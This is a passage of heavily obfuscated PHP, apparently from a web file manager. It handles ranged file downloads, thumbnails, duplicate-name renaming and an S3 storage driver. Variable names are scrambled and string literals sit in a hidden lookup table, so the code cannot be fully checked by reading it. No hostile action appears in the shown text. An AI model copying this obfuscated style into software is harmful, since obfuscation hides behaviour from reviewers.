$Ã…ò¬ãé = $this->getContent($’æøÒ—); $Ã…ò¬ãé = Html::clearSVG($Ã…ò¬ãé); header($Á€ô†Õ[149] . strlen($Ã…ò¬ãé)); echo $Ã…ò¬ãé; die; } $¾‚çéıí = strtolower($_SERVER[$Á€ô†Õ[150]]); if ($òÚ€‹Õ’ && $¾‚çéıí && $Û¯ÙÎÎ©) { if (strstr($¾‚çéıí, $Á€ô†Õ[151])) { header($Á€ô†Õ[152] . $’æøÒ—); } else { if (strstr($¾‚çéıí, $Á€ô†Õ[153])) { header($Á€ô†Õ[154] . $’æøÒ—); } else { if (strstr($¾‚çéıí, $Á€ô†Õ[155])) { header($Á€ô†Õ[156] . $’æøÒ—); } } } if ($¡Æ€¸¦…) { header($Á€ô†Õ[157] . $¡Æ€¸¦…); } return; } if (isset($_SERVER[$Á€ô†Õ[158]])) { if (preg_match($Á€ô†Õ[159], $_SERVER[$Á€ô†Õ[158]], $ˆ“÷’¶)) { $ê¯¹ ¥º = intval($ˆ“÷’¶[1]); if (!empty($ˆ“÷’¶[2])) { $ŠÖ¸»– = intval($ˆ“÷’¶[2]); } } header($Á€ô†Õ[160]); header("\103\157\156\x74\x65\156\164\55\122\x61\x6e\x67\145\x3a\x20\x62\x79\164\x65\x73\x20{$ê¯¹ ¥º}\x2d{$ŠÖ¸»–}\x2f" . $ÒÆã¿èş); } else { header($Á€ô†Õ[161]); } header($Á€ô†Õ[162]); $ÍæÖ¶® = !0; if ($_SERVER[$Á€ô†Õ[163]] == $Á€ô†Õ[164] && $ÒÆã¿èş > 1204 * 1024 * 1024 * 2) { $ÍæÖ¶® = !1; } if ($ÍæÖ¶®) { header($Á€ô†Õ[165] . ($ŠÖ¸»– - $ê¯¹ ¥º + 1)); } if ($_SERVER[$Á€ô†Õ[166]] == $Á€ô†Õ[167]) { return; } $Ê×â€¯‡ = 1024 * 100; $–°ŠôÂ = 0; if ($¡Æ€¸¦…) { $–°ŠôÂ = intval(1000 * 1000 * ($Ê×â€¯‡ / $¡Æ€¸¦…)); } while ($ê¯¹ ¥º <= $ŠÖ¸»–) { $›ÛÒ«ì‡ = timeFloat(); check_abort(); $©àöÀ¥… = $ŠÖ¸»– - $ê¯¹ ¥º + 1; if ($©àöÀ¥… <= $Ê×â€¯‡) { $Ê×â€¯‡ = $©àöÀ¥…; } echo $this->fileSubstr($’æøÒ—, $ê¯¹ ¥º, $Ê×â€¯‡); $ê¯¹ ¥º += $Ê×â€¯‡; if ($Ê×â€¯‡ == $©àöÀ¥…) { $ê¯¹ ¥º = $ŠÖ¸»– + 1; } if ($–°ŠôÂ) { $ªÕ°ƒÜ˜ = intval(1000 * 1000 * (timeFloat() - $›ÛÒ«ì‡)); $ñ®»¥ÎÈ = $–°ŠôÂ - $ªÕ°ƒÜ˜; if ($ñ®»¥ÎÈ > 5) { usleep($ñ®»¥ÎÈ); } } } } public function fileOutServer($•™ëŠË˜, $›İÚãê = false, $§º“Ï­ü = false, $äıÍÖº = '') { $this->fileOut($•™ëŠË˜, $›İÚãê, $§º“Ï­ü, $äıÍÖº); } public function fileOutLink($æäÃ²­) { header($_SERVER[¹àö™Ç¾][168] . $æäÃ²­); die; } public function cacheMethod($œÆ’¨Ü, $ãŞ±µäÎ, $²ğ÷‚Î = null) { $‡öäŸ›™ =& $_SERVER[¹àö™Ç¾]; static $“»À¢ëâ = array(); $ÓŞË¬ÈÉ = $ãŞ±µäÎ ? ltrim($this->getPathOuter($ãŞ±µäÎ), $‡öäŸ›™[18]) : $ãŞ±µäÎ; $³è‘İÏº = $‡öäŸ›™[169] . $œÆ’¨Ü . $‡öäŸ›™[170] . rtrim($ÓŞË¬ÈÉ, $‡öäŸ›™[18]); if (is_null($œÆ’¨Ü)) { $“»À¢ëâ = array(); return; } if (is_null($ãŞ±µäÎ)) { unset($“»À¢ëâ[$³è‘İÏº]); return; } if (!is_null($²ğ÷‚Î)) { $“»À¢ëâ[$³è‘İÏº] = $²ğ÷‚Î; return; } $­Ú”à‰­ = isset($“»À¢ëâ[$³è‘İÏº]) ? $“»À¢ëâ[$³è‘İÏº] : null; if (!is_null($­Ú”à‰­)) { return $­Ú”à‰­; } $­Ú”à‰­ = $this->{$œÆ’¨Ü}($ãŞ±µäÎ); $“»À¢ëâ[$³è‘İÏº] = $­Ú”à‰­; return $­Ú”à‰­; } public function fileOutImage($„æøŠ°, $ù Í¾˜º = 250) { $ª¥õî‘ =& $_SERVER[¹àö™Ç¾]; set_timeout(); if (substr($„æøŠ°, 0, 4) == $ª¥õî‘[155]) { $this->fileOutLink($„æøŠ°); } $ï½ƒù·‰ = $this->info($„æøŠ°); $‚™¹’Õ = $ï½ƒù·‰[$ª¥õî‘[42]]; $áˆÂ¤Œ¼ = !1; if (isset($GLOBALS[$ª¥õî‘[171]]) && $GLOBALS[$ª¥õî‘[171]][$ª¥õî‘[88]] == $ï½ƒù·‰[$ª¥õî‘[88]]) { $ê¢€¶ = $GLOBALS[$ª¥õî‘[171]][$ª¥õî‘[172]]; if (!$ï½ƒù·‰[$ª¥õî‘[173]]) { $ï½ƒù·‰[$ª¥õî‘[173]] = $GLOBALS[$ª¥õî‘[171]]; } if (isset($ê¢€¶[$ª¥õî‘[174]])) { if ($ê¢€¶[$ª¥õî‘[174]] <= $ù Í¾˜º && $ê¢€¶[$ª¥õî‘[175]] <= $ù Í¾˜º) { $áˆÂ¤Œ¼ = !0; } } $‚™¹’Õ = $ï½ƒù·‰[$ª¥õî‘[173]][$ª¥õî‘[42]]; } if ($ï½ƒù·‰[$ª¥õî‘[90]] <= 1024 * 50 || $áˆÂ¤Œ¼ || !function_exists($ª¥õî‘[176]) || $ï½ƒù·‰[$ª¥õî‘[177]] == $ª¥õî‘[178]) { return $this->fileOut($„æøŠ°, !1, $‚™¹’Õ); } if (isset($ï½ƒù·‰[$ª¥õî‘[173]][$ª¥õî‘[179]])) { $²œùˆ” = $ï½ƒù·‰[$ª¥õî‘[173]][$ª¥õî‘[179]]; } else { if (isset($ï½ƒù·‰[$ª¥õî‘[173]][$ª¥õî‘[180]])) { $²œùˆ” = $ï½ƒù·‰[$ª¥õî‘[173]][$ª¥õî‘[180]]; } else { $²œùˆ” = md5("{$ï½ƒù·‰[$ª¥õî‘[42]]}\x5f{$ï½ƒù·‰[$ª¥õî‘[88]]}\x5f{$ï½ƒù·‰[$ª¥õî‘[90]]}"); } } $Ö‘§û²Ç = "{$²œùˆ”}\137{$ù Í¾˜º}\x2e\160\x6e\x67"; if (!($¡ÙÈ•À¦ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ª¥õî‘[181]))) { $©û‰ıı = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ª¥õî‘[182]); } else { $©û‰ıı = KodIO::make($¡ÙÈ•À¦); } if ($¡ÙÈ•À¦ = IO::fileNameExist($©û‰ıı, $Ö‘§û²Ç)) { $ÈÑ³É«Ê = KodIO::make($¡ÙÈ•À¦); return IO::fileOut($ÈÑ³É«Ê, !1, $‚™¹’Õ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ÈÑ³É«Ê = DATA_THUMB . $Ö‘§û²Ç; del_file($ÈÑ³É«Ê); if (!@file_exists($ÈÑ³É«Ê)) { $Óö¤Ğ‹• = TEMP_FILES; if (!is_dir($Óö¤Ğ‹•)) { mk_dir($Óö¤Ğ‹•); } $ù”ÁÔ• = $Óö¤Ğ‹• . $²œùˆ” . $ª¥õî‘[20] . $ï½ƒù·‰[$ª¥õî‘[177]]; if (!@file_exists($ù”ÁÔ•)) { $ù”ÁÔ• = $this->download($„æøŠ°, $ù”ÁÔ•); } ImageThumb::createThumb($ù”ÁÔ•, $ÈÑ³É«Ê, $ù Í¾˜º, $ù Í¾˜º * 10); } if (!file_exists($ÈÑ³É«Ê) || filesize($ÈÑ³É«Ê) < 100) { return @file_exists($ù”ÁÔ•) ? IO::fileOut($ù”ÁÔ•) : $this->fileOut($„æøŠ°); } if (!($õÎåÉàĞ = IO::move($ÈÑ³É«Ê, $©û‰ıı))) { return IO::fileOut($ÈÑ³É«Ê); } del_file($ÈÑ³É«Ê); IO::fileOut($õÎåÉàĞ); } public function fileOutImageServer($ã–ı ¬±, $¤Ì€ó’ = 250) { $this->fileOutImage($ã–ı ¬±, $¤Ì€ó’); } public function fileNameAuto($Ì÷É™¶, $£–²Á£Ö, $Ûèıâ®ú = REPEAT_RENAME, $Í²ÖåÀ‹ = false) { $‹ıò›à =& $_SERVER[¹àö™Ç¾]; $ÁØš´Å³ = $Ì÷É™¶ === $‹ıò›à[22] ? $£–²Á£Ö : rtrim($Ì÷É™¶, $‹ıò›à[18]) . $‹ıò›à[18] . $£–²Á£Ö; if ($Ûèıâ®ú == REPEAT_REPLACE || !$this->exist($ÁØš´Å³) || $Í²ÖåÀ‹ && $Ûèıâ®ú != REPEAT_RENAME_FOLDER) { return $£–²Á£Ö; } if ($Ûèıâ®ú == REPEAT_SKIP) { return !1; } $é•Áàõ… = $‹ıò›à[20] . get_path_ext($£–²Á£Ö); $é•Áàõ… = $é•Áàõ… == $‹ıò›à[20] || $Í²ÖåÀ‹ ? $‹ıò›à[22] : $é•Áàõ…; $Ã™Œ½õ = 1; $ÍŸÉ“Š± = substr($£–²Á£Ö, 0, strlen($£–²Á£Ö) - strlen($é•Áàõ…)); $ì—°ÇØİ = $ÍŸÉ“Š± . "\x28{$Ã™Œ½õ}\51{$é•Áàõ…}"; while ($this->exist(rtrim($Ì÷É™¶, $‹ıò›à[18]) . $‹ıò›à[18] . $ì—°ÇØİ)) { $ì—°ÇØİ = $ÍŸÉ“Š± . "\50{$Ã™Œ½õ}\51{$é•Áàõ…}"; $Ã™Œ½õ++; } return $ì—°ÇØİ; } private function fileNameAutoList($÷£¡¹Øƒ, $ÊÀù¤Ğ, $›“İô…› = false) { $Ü–“°ò =& $_SERVER[¹àö™Ç¾]; $¦¹î£Ãù = $this->listPath($÷£¡¹Øƒ, !0); $¦¹î£Ãù = array_merge($¦¹î£Ãù[$Ü–“°ò[87]], $¦¹î£Ãù[$Ü–“°ò[86]]); $ğÅƒğ” = array_to_keyvalue($¦¹î£Ãù, $Ü–“°ò[22], $Ü–“°ò[42]); $äÉÜîÊ = $Ü–“°ò[20] . get_path_ext($ÊÀù¤Ğ); $äÉÜîÊ = $äÉÜîÊ == $Ü–“°ò[20] || $›“İô…› ? $Ü–“°ò[22] : $äÉÜîÊ; $÷—·Èí± = substr($ÊÀù¤Ğ, 0, strlen($ÊÀù¤Ğ) - strlen($äÉÜîÊ)); $€·›¶é = $÷—·Èí± . "\50\x30\51{$äÉÜîÊ}"; for ($‰Ù ñ£À = 1; $‰Ù ñ£À <= count($ğÅƒğ”) + 1; $‰Ù ñ£À++) { $€·›¶é = $÷—·Èí± . "\x28{$‰Ù ñ£À}\51{$äÉÜîÊ}"; if (!in_array_not_case($€·›¶é, $ğÅƒğ”)) { return $€·›¶é; } } return $€·›¶é; } public function listAllFiles($úÔÍ¦†™, $—†·ø†ş, $ÎœœÑ„ = array()) { $Ö­¹´È =& $_SERVER[¹àö™Ç¾]; if (empty($—†·ø†ş)) { return array(); } $÷Âêä¸Ğ = array(); $úÔÍ¦†™ = trim($úÔÍ¦†™, $Ö­¹´È[18]); foreach ($—†·ø†ş as $†âª¦ŞŸ) { $Ö‰„ğƒ = ltrim(substr(trim($†âª¦ŞŸ, $Ö­¹´È[18]), strlen($úÔÍ¦†™)), $Ö­¹´È[18]); $÷Âêä¸Ğ = array_merge($÷Âêä¸Ğ, $this->slicePath($Ö‰„ğƒ)); } $ïéÂëøú = array(); foreach (array_unique($÷Âêä¸Ğ) as $†âª¦ŞŸ) { $‚ª×Ÿ· = array($Ö­¹´È[88] => $this->getPathOuter($Ö­¹´È[18] . $úÔÍ¦†™ . $Ö­¹´È[18] . $†âª¦ŞŸ), $Ö­¹´È[89] => 1, $Ö­¹´È[90] => 0); if (substr($†âª¦ŞŸ, -1) != $Ö­¹´È[18]) { $‚ª×Ÿ·[$Ö­¹´È[89]] = 0; $Á·½Ç¤· = $this->getPath($úÔÍ¦†™ . $Ö­¹´È[18] . $†âª¦ŞŸ); $‚ª×Ÿ·[$Ö­¹´È[90]] = isset($ÎœœÑ„[$Á·½Ç¤·]) ? $ÎœœÑ„[$Á·½Ç¤·] : $this->size($Á·½Ç¤·); } $ïéÂëøú[] = $‚ª×Ÿ·; } return $ïéÂëøú; } public function slicePath($üƒ™×–­) { $Ö…®¬÷é =& $_SERVER[¹àö™Ç¾]; $ıÜ„‚ã = explode($Ö…®¬÷é[18], trim($üƒ™×–­, $Ö…®¬÷é[18])); $ïÜÓ«é = 0; do { ++$ïÜÓ«é; $²ùòŞ£—[] = implode($Ö…®¬÷é[18], array_slice($ıÜ„‚ã, 0, $ïÜÓ«é)) . $Ö…®¬÷é[18]; } while ($ïÜÓ«é < count($ıÜ„‚ã)); $²ùòŞ£—[count($ıÜ„‚ã) - 1] = $üƒ™×–­; return $²ùòŞ£—; } public function getHost() { $æ·›šÖ =& $_SERVER[¹àö™Ç¾]; $«·¢µî• = parse_url(trim($this->domain, $æ·›šÖ[18])); $ˆÎŠé‡ò = isset($«·¢µî•[$æ·›šÖ[183]]) ? $«·¢µî•[$æ·›šÖ[183]] : http_type(); $•ã¢×¨ = isset($«·¢µî•[$æ·›šÖ[184]]) ? $«·¢µî•[$æ·›šÖ[184]] : $«·¢µî•[$æ·›šÖ[88]]; if (isset($«·¢µî•[$æ·›šÖ[185]])) { $•ã¢×¨ .= $æ·›šÖ[4] . $«·¢µî•[$æ·›šÖ[185]]; } return $ˆÎŠé‡ò . $æ·›šÖ[186] . $•ã¢×¨; } public function pathEncode($¾¬Àœ§¬) { $êä·ÀŒš =& $_SERVER[¹àö™Ç¾]; return str_replace($êä·ÀŒš[187], $êä·ÀŒš[18], rawurlencode($¾¬Àœ§¬)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($Õ±ı¥§¤) { set_timeout(); require_once SDK_DIR . $_SERVER[¹àö™Ç¾][188]; parent::__construct(); $this->_init($Õ±ı¥§¤); } public function _init($åŒÄ‚îÕ) { foreach ($åŒÄ‚îÕ as $–ˆ°µÖë => $à‚şÍİ„) { if (isset($this->{$–ˆ°µÖë})) { $this->{$–ˆ°µÖë} = $à‚şÍİ„; } } $this->endpoint = $åŒÄ‚îÕ[$_SERVER[¹àö™Ç¾][189]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¸Öô–¾Î = "\166\x34") { $this->signVer = $¸Öô–¾Î; $this->client->setSignatureVersion($¸Öô–¾Î); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $£È¼úâ =& $_SERVER[¹àö™Ç¾]; $ÍöÌ­ŸÚ = $this->getBucketCors(); if (!$ÍöÌ­ŸÚ || !is_array($ÍöÌ­ŸÚ)) { return !1; } if ($ÍöÌ­ŸÚ[$£È¼úâ[190]] != $£È¼úâ[191] || $ÍöÌ­ŸÚ[$£È¼úâ[192]] != $£È¼úâ[191]) { return !1; } $§Éö„§º = array_map($£È¼úâ[193], $ÍöÌ­ŸÚ[$£È¼úâ[194]]); if (!is_array($§Éö„§º)) { $§Éö„§º = array(); } $•±½Õ² = array($£È¼úâ[195], $£È¼úâ[196], $£È¼úâ[197], $£È¼úâ[198], $£È¼úâ[199]); $ÆÀ£Ò™ = array_diff($•±½Õ², $§Éö„§º); return empty($ÆÀ£Ò™); } public function mkfile($á±‘‰“‰, $¥ÎÖœ€ô = '', $¹¨Œô„º = REPEAT_RENAME) { $ıòş¤ŠÍ = $this->setContent($á±‘‰“‰, $¥ÎÖœ€ô); if ($ıòş¤ŠÍ !== !1) { return $this->getPathOuter($á±‘‰“‰); } return !1; } public function mkdir($ÌÜ•ú», $°È˜ª³Õ = REPEAT_SKIP) { $ä¼ê“¥ˆ =& $_SERVER[¹àö™Ç¾]; if (empty($ÌÜ•ú») && $ÌÜ•ú» !== $ä¼ê“¥ˆ[200]) { return !1; } if ($this->_isFolder($ÌÜ•ú»)) { return $this->getPathOuter($ÌÜ•ú»); } $”›­¾Ëõ = $this->setContent($ÌÜ•ú», $ä¼ê“¥ˆ[22], !0); if ($”›­¾Ëõ !== !1) { return $this->getPathOuter($ÌÜ•ú»); } return !1; } public function copyFile($¦›ã£„¼, $ÂÛ¦âÊŒ, $øó¶ÅÁ = array()) { $ÚÙˆÓã¶ =& $_SERVER[¹àö™Ç¾]; $¯Á¦ÓÇÙ = $this->objectMeta($¦›ã£„¼); if (!$¯Á¦ÓÇÙ) { return !1; } if ($¯Á¦ÓÇÙ[$ÚÙˆÓã¶[90]] <= 1024 * 1024 * 200) { $ƒÛÌò¬² = $this->client->copyObject($this->bucket, $¦›ã£„¼, $this->bucket, $ÂÛ¦âÊŒ, $ÚÙˆÓã¶[201], $øó¶ÅÁ); } else { $ƒÛÌò¬² = $this->client->multiCopyObject($this->bucket, $¦›ã£„¼, $this->bucket, $ÂÛ¦âÊŒ, $øó¶ÅÁ); } $ƒÛÌò¬² = $ƒÛÌò¬² ? $this->getPathOuter($ÂÛ¦âÊŒ) : !1; return $ƒÛÌò¬²; } public function moveFile($¥æ¼®Àä, $ıæºéƒÌ) { if ($this->copyFile($¥æ¼®Àä, $ıæºéƒÌ)) { $this->delFile($¥æ¼®Àä); return $this->getPathOuter($ıæºéƒÌ); } return !1; } public function delFile($ª„òå·Í) { return $this->client->deleteObject($this->bucket, $ª„òå·Í); } public function delFolder($°Â£«Ñà) { $ÃÍ­·ãº =& $_SERVER[¹àö™Ç¾]; if (!$this->exist($°Â£«Ñà)) { return !0; } $this->listItemCache = !1; $‘Ö¯ëÀ¢ = $this->fileList($°Â£«Ñà); $this->listItemCache = !0; $¢¡ÇÈî» = trim($°Â£«Ñà, $ÃÍ­·ãº[18]) . $ÃÍ­·ãº[18]; if (!empty($°Â£«Ñà) && $°Â£«Ñà !== $ÃÍ­·ãº[200] && !in_array($¢¡ÇÈî», $‘Ö¯ëÀ¢[$ÃÍ­·ãº[87]])) { $‘Ö¯ëÀ¢[$ÃÍ­·ãº[87]][] = $¢¡ÇÈî»; } $Í‘ÒÍâß = $this->delByBatch($‘Ö¯ëÀ¢[$ÃÍ­·ãº[86]]); if (!$Í‘ÒÍâß) { return !1; } $Í‘ÒÍâß = $this->delByBatch($‘Ö¯ëÀ¢[$ÃÍ­·ãº[87]]); if (!$Í‘ÒÍâß) { return !1; } return $this->delFile($¢¡ÇÈî»); } private function delByBatch($·ë¼‹å) { foreach (array_chunk($·ë¼‹å, 1000) as $µÊ˜Éá) { $ò±Ğ¹…ã = $this->client->deleteObjects($this->bucket, $µÊ˜Éá); if (!$ò±Ğ¹…ã) { return !1; } } return !0; } public function rename($ÁÙç¿Ùï, $…Î‚ìÛê) { return $this->renameObject($ÁÙç¿Ùï, $…Î‚ìÛê); } public function listPath($ïÏíÉÚà, $ßîÀõÁ¿ = false) { $ËüºØáè =& $_SERVER[¹àö™Ç¾]; $Ş–ğŞğ = $this->fileList($ïÏíÉÚà, $ËüºØáè[18], !0); foreach ($Ş–ğŞğ[$ËüºØáè[87]] as $‹Á çğÛ => $éş­ŠÄû) { $Ş–ğŞğ[$ËüºØáè[87]][$‹Á çğÛ] = $this->folderInfo($éş­ŠÄû, $ßîÀõÁ¿); } foreach ($Ş–ğŞğ[$ËüºØáè[86]] as $‹Á çğÛ => $éş­ŠÄû) { $Ş–ğŞğ[$ËüºØáè[86]][$‹Á çğÛ] = $this->fileInfo($éş­ŠÄû[$ËüºØáè[42]], $ßîÀõÁ¿, $éş­ŠÄû); } return $Ş–ğŞğ; } private function fileInfo($®™º™Ï¸, $øŞ“ŠÏ = false, $÷ÔÚ¦½– = array()) { $ÀÖµÌÁå =& $_SERVER[¹àö™Ç¾]; $®øïó®“ = array($ÀÖµÌÁå[42] => $this->pathThis($®™º™Ï¸), $ÀÖµÌÁå[88] => $this->getPathOuter($®™º™Ï¸), $ÀÖµÌÁå[43] => $ÀÖµÌÁå[202], $ÀÖµÌÁå[177] => $this->ext($®™º™Ï¸), $ÀÖµÌÁå[90] => isset($÷ÔÚ¦½–[$ÀÖµÌÁå[90]]) ? $÷ÔÚ¦½–[$ÀÖµÌÁå[90]] : 0); if ($øŞ“ŠÏ) { return $®øïó®“; } $®øïó®“[$ÀÖµÌÁå[203]] = $®øïó®“[$ÀÖµÌÁå[96]] = 0; $®øïó®“[$ÀÖµÌÁå[204]] = $®øïó®“[$ÀÖµÌÁå[205]] = !0; if (empty($÷ÔÚ¦½–)) { $÷ÔÚ¦½– = $this->objectMeta($®™º™Ï¸); if (!$÷ÔÚ¦½–) { return $®øïó®“; } } if (isset($÷ÔÚ¦½–[$ÀÖµÌÁå[206]])) { $®øïó®“[$ÀÖµÌÁå[96]] = $÷ÔÚ¦½–[$ÀÖµÌÁå[206]]; } if (isset($÷ÔÚ¦½–[$ÀÖµÌÁå[90]])) { $®øïó®“[$ÀÖµÌÁå[90]] = $÷ÔÚ¦½–[$ÀÖµÌÁå[90]]; } return $®øïó®“; } private function folderInfo($ğ›½¶É, $ÄÏôü = false) { $ÆÁŠ«ô± =& $_SERVER[¹àö™Ç¾]; $Üéªæêø = array($ÆÁŠ«ô±[42] => $this->pathThis($ğ›½¶É), $ÆÁŠ«ô±[88] => $this->getPathOuter($ÆÁŠ«ô±[18] . $ğ›½¶É), $ÆÁŠ«ô±[43] => $ÆÁŠ«ô±[89]); if ($ÄÏôü) { return $Üéªæêø; } $Üéªæêø[$ÆÁŠ«ô±[203]] = $Üéªæêø[$ÆÁŠ«ô±[96]] = 0; $Üéªæêø[$ÆÁŠ«ô±[204]] = $Üéªæêø[$ÆÁŠ«ô±[205]] = !0; if ($ğ›½¶É == $ÆÁŠ«ô±[22]) { return $Üéªæêø; } $ğ›½¶É = trim($ğ›½¶É, $ÆÁŠ«ô±[18]) . $ÆÁŠ«ô±[18]; $©ÅèèÒæ = $this->objectMeta($ğ›½¶É); if (isset($©ÅèèÒæ[$ÆÁŠ«ô±[206]])) { $Üéªæêø[$ÆÁŠ«ô±[203]] = $©ÅèèÒæ[$ÆÁŠ«ô±[206]]; } return $Üéªæêø; } private function fileList($ÅÑÃ…, $Âüã±ˆ§ = '', $”ĞêºÉ = 0) { $«ÙÀ€š– =& $_SERVER[¹àö™Ç¾]; $÷ëóşò™ = rtrim($ÅÑÃ…, $«ÙÀ€š–[18]) . $«ÙÀ€š–[18]; $„½Ó™×é = $this->listObjs($÷ëóşò™, null, null, $Âüã±ˆ§); if (!$„½Ó™×é) { return array($«ÙÀ€š–[87] => array(), $«ÙÀ€š–[86] => array()); } $µú¿Î­ = $this->listItemCache === !1 ? !1 : !0; $˜¦‘Ãù = $Í¢ÌŠ¨ = array(); foreach ($„½Ó™×é[$«ÙÀ€š–[207]] as $ Ãë¢…æ) { $¢«Œ¹ÅÙ = $ Ãë¢…æ[$«ÙÀ€š–[42]]; if ($¢«Œ¹ÅÙ == $÷ëóşò™) { continue; } $–ŸåÛ¾Ç = isset($ Ãë¢…æ[$«ÙÀ€š–[90]]) ? $ Ãë¢…æ[$«ÙÀ€š–[90]] : 0; $Ö’¶Ùş‚ = $–ŸåÛ¾Ç == 0 && substr($¢«Œ¹ÅÙ, strlen($¢«Œ¹ÅÙ) - 1, 1) == $«ÙÀ€š–[18] ? !0 : !1; if ($µú¿Î­) { $this->cacheMethod($«ÙÀ€š–[208], $¢«Œ¹ÅÙ, $Ö’¶Ùş‚); $this->cacheMethod($«ÙÀ€š–[209], $¢«Œ¹ÅÙ, $ Ãë¢…æ); } if ($Ö’¶Ùş‚) { $˜¦‘Ãù[] = $¢«Œ¹ÅÙ; continue; } $Í¢ÌŠ¨[] = $”ĞêºÉ ? $ Ãë¢…æ : $¢«Œ¹ÅÙ; } foreach ($„½Ó™×é[$«ÙÀ€š–[210]] as $ Ãë¢…æ) { $˜¦‘Ãù[] = $ Ãë¢…æ[$«ÙÀ€š–[42]]; if ($µú¿Î­) { $this->cacheMethod($«ÙÀ€š–[208], $ Ãë¢…æ[$«ÙÀ€š–[42]], !0); } } if ($µú¿Î­) { $this->cacheMethod($«ÙÀ€š–[208], $ÅÑÃ…, !0); } return array($«ÙÀ€š–[87] => $˜¦‘Ãù, $«ÙÀ€š–[86] => $Í¢ÌŠ¨); } private function listObjs($°ã¶€ûˆ, $‚Ü©éü° = null, $Ä×Â„ğÓ = null, $¾Ğ˜ÆÇñ = null) { $†‹—Ï´î =& $_SERVER[¹àö™Ç¾]; $°ã¶€ûˆ = trim($°ã¶€ûˆ, $†‹—Ï´î[18]); $ƒÍÑ ’è = empty($°ã¶€ûˆ) && $°ã¶€ûˆ !== $†‹—Ï´î[200] ? $†‹—Ï´î[22] : $°ã¶€ûˆ . $†‹—Ï´î[18]; return $this->client->getBucket($this->bucket, $ƒÍÑ ’è, $‚Ü©éü°, $Ä×Â„ğÓ, $¾Ğ˜ÆÇñ, !0); } public function has($£¹å…¥, $ß„Ğ„·Ã = false, $ûü©ôÜ = true) { $ŒÁòò‹Ğ =& $_SERVER[¹àö™Ç¾]; $£¹å…¥ = trim($£¹å…¥, $ŒÁòò‹Ğ[18]); $àôÔ³© = empty($£¹å…¥) && $£¹å…¥ !== $ŒÁòò‹Ğ[200] ? $ŒÁòò‹Ğ[22] : $£¹å…¥ . $ŒÁòò‹Ğ[18]; $é’µÙ = null; $º°…ıà— = 500; $§µÕŠê = $ŒÁòò‹Ğ[18]; $Á·Úå°ò = $˜«ÓïÖÃ = array(); while (!0) { $£Ëêé”¢ = $this->listObjs($£¹å…¥, $é’µÙ, $º°…ıà—, $§µÕŠê); if (!$£Ëêé”¢) { break; } $é’µÙ = $£Ëêé”¢[$ŒÁòò‹Ğ[211]]; $àøößÑ« = $£Ëêé”¢[$ŒÁòò‹Ğ[207]]; $½¯’õõ = $£Ëêé”¢[$ŒÁòò‹Ğ[210]]; if (empty($àøößÑ«) && empty($½¯’õõ)) { break; } if (count($àøößÑ«) == 1 && $àøößÑ«[0][$ŒÁòò‹Ğ[42]] == $àôÔ³©) { break; } if ($ß„Ğ„·Ã) { if (count($àøößÑ«)) { $àøößÑ« = array_column($àøößÑ«, $ŒÁòò‹Ğ[42]); $Á·Úå°ò = array_merge($Á·Úå°ò, $àøößÑ«); } if (count($½¯’õõ)) { $½¯’õõ = array_column($½¯’õõ, $ŒÁòò‹Ğ[42]); $˜«ÓïÖÃ = array_merge($˜«ÓïÖÃ, $½¯’õõ); } if ($é’µÙ === null) { break; } continue; } if ($ûü©ôÜ) { if (!empty($àøößÑ«)) { if (count($àøößÑ«) > 1 || isset($àøößÑ«[0][$ŒÁòò‹Ğ[42]]) && $àøößÑ«[0][$ŒÁòò‹Ğ[42]] != $àôÔ³©) { return !0; } } } else { if (!empty($½¯’õõ)) { return !0; } } if ($é’µÙ === null) { break; } } if ($ß„Ğ„·Ã) { $Á·Úå°ò = array_diff($Á·Úå°ò, array($àôÔ³©)); $Á·Úå°ò = count(array_unique($Á·Úå°ò)); $˜«ÓïÖÃ = count(array_unique($˜«ÓïÖÃ)); return array($ŒÁòò‹Ğ[212] => $Á·Úå°ò, $ŒÁòò‹Ğ[213] => $˜«ÓïÖÃ); } return !1; } public function listAll($£¦Ö†») { $½Äü–ƒ =& $_SERVER[¹àö™Ç¾]; $°Ô«‘ˆ = $this->fileList($£¦Ö†», $½Äü–ƒ[22], !0); $İ²òê“” = array(); foreach ($°Ô«‘ˆ[$½Äü–ƒ[86]] as $µ©ƒ˜”œ) { $İ²òê“”[$µ©ƒ˜”œ[$½Äü–ƒ[42]]] = $µ©ƒ˜”œ[$½Äü–ƒ[90]]; } foreach ($°Ô«‘ˆ[$½Äü–ƒ[87]] as $µ©ƒ˜”œ) { if (is_string($µ©ƒ˜”œ)) { $İ²òê“”[$µ©ƒ˜”œ] = 0; } } return $this->listAllFiles($£¦Ö†», array_keys($İ²òê“”), $İ²òê“”); } public function canRead($ÙÏô˜õ) { $ÓæúÁ“¬ =& $_SERVER[¹àö™Ç¾]; $¨˜ † = $this->client->getAccessControlPolicy($this->bucket, $ÙÏô˜õ); if (!$¨˜ †) { return !1; } return in_array($¨˜ †, array($ÓæúÁ“¬[214], $ÓæúÁ“¬[215], $ÓæúÁ“¬[216])) ? !0 : !1; } public function canWrite($Ãöüî£) { $–ŞòûÖÛ =& $_SERVER[¹àö™Ç¾]; $ñİåè² = $this->client->getAccessControlPolicy($this->bucket, $Ãöüî£); if (!$ñİåè²) { return !1; } return in_array($ñİåè², array($–ŞòûÖÛ[214], $–ŞòûÖÛ[215])) ? !0 : !1; } public function getContent($ĞÉúá¥) { return $this->client->getObject($this->bucket, $ĞÉúá¥); } public function setContent($›ŒğºÎú, $´ªÇû¤² = '', $¸™Ä«±É = false) { $ÏšƒÎ­µ =& $_SERVER[¹àö™Ç¾]; $›ŒğºÎú = $¸™Ä«±É ? trim($›ŒğºÎú, $ÏšƒÎ­µ[18]) . $ÏšƒÎ­µ[18] : $›ŒğºÎú; $ÔÌª¨Ø· = get_file_mime(get_path_ext($›ŒğºÎú)); $óù‘¢È² = $this->client->putObject($´ªÇû¤², $this->bucket, $›ŒğºÎú, $ÏšƒÎ­µ[201], array(), $ÔÌª¨Ø·); if (!$óù‘¢È²) { return !1; } if ($¸™Ä«±É) { return !0; } $this->cacheMethod(null, null); 